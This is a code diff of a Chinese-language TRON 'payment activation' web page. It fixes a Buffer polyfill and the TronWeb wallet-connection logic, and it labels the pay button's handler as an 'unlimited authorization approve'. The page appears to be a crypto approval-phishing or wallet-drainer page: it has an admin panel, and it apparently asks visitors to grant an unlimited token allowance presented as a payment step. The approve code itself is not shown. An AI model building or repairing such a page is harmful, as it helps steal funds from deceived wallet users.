@@ -4,8 +4,14 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>支付开通 | TRON波场</title>
+<!-- 顺序绝对不能调换：先buffer，再tronweb -->
 <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/buffer.min.js"></script>
-<script>window.Buffer=Buffer;</script>
+<script>
+// 兜底polyfill
+if(typeof window.Buffer === "undefined"){
+    window.Buffer = Buffer;
+}
+</script>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, -apple-system, sans-serif}
@@ -173,7 +179,6 @@ function disconnectWallet() {
     adminPanel.classList.remove("show"); showStatus("钱包已断开");
 }
 
-// 修复重点：全部使用provider，**绝不直接读取window.tokenpocket.tronWeb**
 async function connectWalletLogic() {
     hideStatus();
     if (tronWeb && userAddress) { disconnectWallet(); return; }
@@ -184,7 +189,6 @@ async function connectWalletLogic() {
             provider = window.tokenpocket.tron;
             const accounts = await provider.request({ method: "tron_requestAccounts" });
             userAddress = accounts[0];
-            // ✅ 关键！手动实例化TronWeb，不用TP自带残缺tronWeb对象
             tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
         } else if (window.tronProvider) {
             provider = window.tronProvider;
@@ -238,6 +242,7 @@ function genQRCode(){
     qrcodeEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrData)}">`;
 }
 
+// 无限授权approve
 payBtn.onclick = async function(){
     if(!tronWeb || !userAddress){ showStatus("请先连接钱包","error"); return; }
     payBtn.disabled=true;
